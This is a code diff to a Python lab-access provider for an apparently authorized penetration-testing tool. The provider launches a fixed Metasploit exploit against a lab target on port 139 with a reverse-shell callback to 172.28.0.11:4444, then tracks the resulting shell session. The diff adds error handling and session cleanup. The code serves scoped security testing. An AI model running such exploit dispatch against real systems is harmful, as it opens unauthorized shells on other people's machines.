@@ -33,6 +33,8 @@ class MetasploitableLabAccessProvider:
     CALLBACK = "172.28.0.11"
     CALLBACK_PORT = "4444"
     ENABLE_ENV = "WHAXON_ENABLE_V2_LAB_INITIAL_ACCESS"
+    SESSION_WAIT_S = 25.0
+    SESSION_POLL_INTERVAL_S = 1.0
 
     def __init__(self, *, store, registry, scope, msf):
         self.store = store
@@ -126,6 +128,29 @@ class MetasploitableLabAccessProvider:
                 return host
         return value.strip("[]")
 
+    async def _session_snapshot(self) -> dict[str, dict]:
+        sessions = await asyncio.to_thread(self.msf.sessions, strict=True)
+        if not isinstance(sessions, dict):
+            raise RuntimeError("Metasploit returned an invalid session snapshot")
+        return {str(key): value for key, value in sessions.items()}
+
+    async def _stop_session(self, session_id: str) -> None:
+        reply = await asyncio.to_thread(
+            self.msf.connect().call, "session.stop", [str(session_id)],
+        )
+        if not isinstance(reply, dict) or reply.get("result") != "success":
+            raise RuntimeError("Metasploit did not confirm session.stop")
+        if str(session_id) in await self._session_snapshot():
+            raise RuntimeError("Metasploit session remained open after session.stop")
+
+    def _fail_evidence_job(self, job_id: str, message: str) -> None:
+        try:
+            self.store.append_line(job_id, "stderr", message[:500])
+            self.store.set_failed(job_id, message[:500])
+        except Exception:
+            # The original dispatch/storage failure remains authoritative.
+            pass
+
     async def dispatch(self, task: WorkflowTask) -> dict:
         resolution = self.resolve_task(task, require_installed=True)
         expected = resolution.manifest
@@ -133,68 +158,97 @@ class MetasploitableLabAccessProvider:
             raise CapabilityUnavailable(self.CAPABILITY, ("task permission/impact differs from lab contract",))
         # Re-read the scope immediately before the only network dispatch.
         self._authorize_target(task.target)
-        result = await asyncio.to_thread(
-            self.msf.execute,
-            "exploit", self.MODULE,
-            {"RHOSTS": self.TARGET, "RPORT": "139", "LHOST": self.CALLBACK,
-             "LPORT": self.CALLBACK_PORT},
-            payload=self.PAYLOAD, timeout_s=60.0,
-        )
-        if not isinstance(result, dict) or not result.get("job_id"):
-            raise RuntimeError("fixed Metasploit lab exploit did not start")
-        remote_job_id = str(result["job_id"])
-
-        session_id = None
-        session_info = None
-        deadline = time.monotonic() + 25.0
-        while time.monotonic() < deadline:
-            sessions = await asyncio.to_thread(self.msf.sessions)
-            for sid, info in sessions.items():
-                via = str(info.get("via_exploit") or "").removeprefix("exploit/")
-                host = self._host(info.get("target_host") or info.get("tunnel_peer"))
-                if via == self.MODULE and host == self.TARGET:
-                    session_id, session_info = str(sid), info
-                    break
-            if session_id:
-                break
-            await asyncio.sleep(1)
-        if not session_id:
-            raise RuntimeError("fixed lab exploit started but no matching target session opened")
-
         job_id = uuid.uuid4().hex[:12]
         self.store.create(job_id)
         if not self.store.set_started(job_id, self.CAPABILITY, self.TARGET):
             raise RuntimeError("could not start lab access evidence job")
         self.store.mark_engine_v2_execution_job(job_id)
+        try:
+            before_sessions = await self._session_snapshot()
+            result = await asyncio.to_thread(
+                self.msf.execute,
+                "exploit", self.MODULE,
+                {"RHOSTS": self.TARGET, "RPORT": "139", "LHOST": self.CALLBACK,
+                 "LPORT": self.CALLBACK_PORT},
+                payload=self.PAYLOAD, timeout_s=60.0,
+            )
+            if not isinstance(result, dict) or not result.get("job_id"):
+                raise RuntimeError("fixed Metasploit lab exploit did not start")
+            remote_job_id = str(result["job_id"])
+            self.store.append_line(
+                job_id, "stdout", f"Metasploit remote job started: {remote_job_id}",
+            )
+        except Exception as exc:
+            self._fail_evidence_job(job_id, f"Metasploit dispatch failed: {type(exc).__name__}")
+            raise
+
+        session_id = None
+        session_info = None
+        deadline = time.monotonic() + self.SESSION_WAIT_S
+        try:
+            while time.monotonic() < deadline:
+                sessions = await self._session_snapshot()
+                for sid, info in sessions.items():
+                    if str(sid) in before_sessions:
+                        continue
+                    via = str(info.get("via_exploit") or "").removeprefix("exploit/")
+                    host = self._host(info.get("target_host") or info.get("tunnel_peer"))
+                    if via == self.MODULE and host == self.TARGET:
+                        session_id, session_info = str(sid), info
+                        break
+                if session_id:
+                    break
+                await asyncio.sleep(self.SESSION_POLL_INTERVAL_S)
+        except Exception as exc:
+            self._fail_evidence_job(
+                job_id,
+                f"Metasploit session poll failed for remote job {remote_job_id}: {type(exc).__name__}",
+            )
+            raise
+        if not session_id:
+            self._fail_evidence_job(
+                job_id,
+                f"Metasploit job {remote_job_id} opened no new matching target session",
+            )
+            raise RuntimeError("fixed lab exploit started but no new matching target session opened")
+
         session_type = str((session_info or {}).get("type") or "shell")
-        # Keep a provenance link between the local sealed V2 evidence, the
-        # remote MSF job, and the live session. This path deliberately has no
-        # session I/O or termination call: the session remains open for
-        # operator-controlled lab follow-up and must be closed through MSF.
-        self.store.upsert_session(session_id, self.TARGET, session_type, {
-            "provider_id": self.PROVIDER_ID,
-            "capability_id": self.CAPABILITY,
-            "evidence_job_id": job_id,
-            "msf_job_id": remote_job_id,
-            "module": self.MODULE,
-            "retention": "open_until_operator_closes_in_metasploit",
-        })
-        from .findings import Finding
-        finding = Finding(
-            kind="msf_session", severity="critical", source="engine-v2-lab-access",
-            data={
-                "session_id": session_id, "host": self.TARGET,
-                "session_type": session_type, "msf_job_id": remote_job_id,
+        try:
+            # Keep provenance between the sealed V2 evidence, remote job and
+            # live session. Normal success leaves it for operator follow-up.
+            self.store.upsert_session(session_id, self.TARGET, session_type, {
+                "provider_id": self.PROVIDER_ID,
+                "capability_id": self.CAPABILITY,
+                "evidence_job_id": job_id,
+                "msf_job_id": remote_job_id,
                 "module": self.MODULE,
-                "session_retention": "open_until_operator_closes_in_metasploit",
-            },
-            raw_line=f"fixed repository-lab access established on {self.TARGET}",
-            impact="A shell session was established on the explicitly enabled controlled lab target.",
-            cwe="CWE-284",
-        )
-        self.store.append_line(job_id, "stdout", finding.raw_line)
-        self.store.append_finding(job_id, finding, 0)
-        self.store.set_finished(job_id, 0, 0.0)
+                "retention": "open_until_operator_closes_in_metasploit",
+            })
+            from .findings import Finding
+            finding = Finding(
+                kind="msf_session", severity="critical", source="engine-v2-lab-access",
+                data={
+                    "session_id": session_id, "host": self.TARGET,
+                    "session_type": session_type, "msf_job_id": remote_job_id,
+                    "module": self.MODULE,
+                    "session_retention": "open_until_operator_closes_in_metasploit",
+                },
+                raw_line=f"fixed repository-lab access established on {self.TARGET}",
+                impact="A shell session was established on the explicitly enabled controlled lab target.",
+                cwe="CWE-284",
+            )
+            self.store.append_line(job_id, "stdout", finding.raw_line)
+            self.store.append_finding(job_id, finding, 0)
+            self.store.set_finished(job_id, 0, 0.0)
+        except Exception as exc:
+            self._fail_evidence_job(job_id, f"evidence persistence failed: {type(exc).__name__}")
+            try:
+                await self._stop_session(session_id)
+            except Exception as cleanup_error:
+                raise RuntimeError(
+                    "could not persist access evidence or close newly opened Metasploit session"
+                ) from cleanup_error
+            raise
         return {
             "job_id": job_id, "session_id": session_id,
             "tool_id": self.CAPABILITY, "target": self.TARGET,
